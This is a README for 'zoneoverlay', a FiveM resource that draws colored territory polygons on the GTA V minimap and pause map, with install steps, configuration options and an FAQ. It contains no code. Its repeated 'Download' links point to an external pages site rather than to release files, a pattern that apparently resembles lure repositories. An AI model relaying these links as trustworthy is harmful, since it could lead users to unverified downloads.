# zoneoverlay - GTA V Territory Overlay for FiveM

> **Put colored territory shapes onto the GTA V minimap and pause map.** This FiveM resource lets you create semi-transparent polygon overlays for districts, gang areas, events, or any custom region, and includes an in-game panel for drawing and editing zones live.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benpaafisher3158/zoneoverlay-zone-marker-hub?style=flat-square)](https://github.com/benpaafisher3158/zoneoverlay-zone-marker-hub)

---

<p align="center">
  <a href="https://benpaafisher3158.github.io/zoneoverlay-zone-marker-hub/">
    <img src="https://img.shields.io/badge/Download-zoneoverlay%20Script-brightgreen?style=for-the-badge" alt="Download zoneoverlay Script">
  </a>
</p>

> **[Direct Download - zoneoverlay](https://benpaafisher3158.github.io/zoneoverlay-zone-marker-hub/)**

---

[Download Latest Build](https://benpaafisher3158.github.io/zoneoverlay-zone-marker-hub/)

---

## What it does

zoneoverlay uses scaleform manipulation to draw custom colored polygons straight onto the GTA V minimap and pause map. It is built for roleplay servers where admins or developers need to highlight areas like faction turf, safe zones, event borders, or neighborhood boundaries in a way players can see while moving around the world. Because textures are created at runtime, there is no requirement for external image files.

The built-in editor panel lets you add, move, and remove zone points without taking the server down. Zone definitions are saved in JSON and kept in sync for everyone connected. If you need a clear visual marker for a restricted area, a custom district, or any other mapped region, this resource gives you feedback on the two maps players use most often.

---

## Features

- Colored polygon overlays shown on both the minimap and the full-screen pause map
- In-game zone editor panel for creating and adjusting boundaries live
- JSON-based storage that saves zone data and syncs changes to all players automatically
- Lua export functions for querying or changing zones from other scripts
- Runtime texture generation removes the need for prebuilt image assets
- Multiple zones supported, each with its own color and transparency
- Lightweight resource with no extra dependencies beyond a standard FiveM server
- Compatible with any map zoom level and rotation

---

## Installation

1. Download the latest build from the link above.
2. Extract the `zoneoverlay` folder into your FiveM server's `resources` directory.
3. Add `ensure zoneoverlay` to your `server.cfg` file.
4. Restart your server or launch the resource manually with `start zoneoverlay`.

You do not need any extra setup to start using the default zone editor. If you want to create zones from another resource, call the provided Lua exports from your dependency script.

---

## Configuration

You can change the settings below in `config.lua` or from the in-game panel:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `EnableEditor` | boolean | `true` | Toggles the in-game zone creator panel |
| `DefaultOpacity` | number | `0.5` | Transparency level for new zones (0.0–1.0) |
| `EditorKeybind` | string | `F5` | Key to open/close the zone editor |
| `AutoSaveInterval` | number | `30` | Seconds between automatic JSON saves |

---

## Compatibility

- **Platform:** FiveM (Windows and Linux servers)
- **Game version:** Compatible with all current GTA V builds supported by FiveM
- **Known limitations:** The overlay only appears on the minimap and pause map, not on the player's main screen or in first-person mode. Very large numbers of zones (100+) may affect minimap rendering performance on lower-end hardware.

---

## FAQ

**How do I open the zone editor?**  
Use the configured hotkey while in-game, which is F5 by default. The editor panel will open so you can create, select, and edit zones.

**Can I update zones without restarting the server?**  
Yes. Edits made in the panel are written to JSON and pushed to connected clients automatically, so a restart is not needed.

**How do I change a zone's color after creation?**  
Open the editor, pick the zone from the list, and use the color picker to assign a different color. The minimap overlay updates right away.

**Will this work with other map or HUD resources?**  
zoneoverlay relies on scaleform injection and does not swap out core UI elements. It should work alongside most map modifications, although conflicts can happen if another resource touches the same scaleform components.

**Where is zone data stored?**  
Zone definitions are saved on the server in `resources/zoneoverlay/data/zones.json`. You can edit that file manually if required.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
